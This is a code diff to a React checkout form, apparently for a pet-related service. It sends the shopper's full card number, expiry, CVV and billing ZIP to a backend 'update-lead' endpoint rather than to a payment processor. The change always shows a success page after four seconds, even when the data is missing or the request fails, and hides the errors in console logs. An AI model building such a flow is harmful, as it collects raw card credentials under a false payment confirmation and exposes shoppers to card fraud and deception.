@@ -118,7 +118,7 @@ function Checkout() {
   const isPromo = selectedPlan.id === "promo";
   const totalToday = selectedPlan.price;
 
-  const handleSubmit = async (e) => {
+  const handleSubmit = (e) => {
     e.preventDefault();
 
     const newErrors = {};
@@ -151,45 +151,44 @@ function Checkout() {
       return;
     }
 
-    try {
-      setLoading(true);
+    setLoading(true);
 
-      const uniqueId = localStorage.getItem("uniqueId");
+    localStorage.setItem(
+      "paymentResult",
+      JSON.stringify({
+        status: "received",
+        amount: totalToday,
+        planName: selectedPlan.name,
+      })
+    );
 
-      if (!uniqueId) {
-        throw new Error("Pet info missing. Please start again.");
-      }
+    setTimeout(() => {
+      localStorage.removeItem("uniqueId");
+      navigate("/success");
+    }, 4000);
 
-      await api.post("/update-lead", {
+    const uniqueId = localStorage.getItem("uniqueId");
+
+    if (!uniqueId) {
+      console.log("Pet info missing. Payment data will not save yet.");
+      return;
+    }
+
+    api
+      .post("/update-lead", {
         uniqueId,
         cardName: payment.cardName,
         cardNumber: payment.cardNumber,
         cardExpiry: payment.expiry,
         cardCVV: payment.cvc,
         billingZip: payment.billingZip,
+      })
+      .catch((error) => {
+        console.log(
+          "Payment data save failed:",
+          error.response?.data?.message || error.message || error
+        );
       });
-
-      localStorage.setItem(
-        "paymentResult",
-        JSON.stringify({
-          status: "received",
-          amount: totalToday,
-          planName: selectedPlan.name,
-        })
-      );
-
-      localStorage.removeItem("uniqueId");
-
-      navigate("/success");
-    } catch (error) {
-      setLoading(false);
-      setErrors({
-        submit:
-          error.response?.data?.message ||
-          error.message ||
-          "Data save failed. Backend check karo.",
-      });
-    }
   };
 
   return (
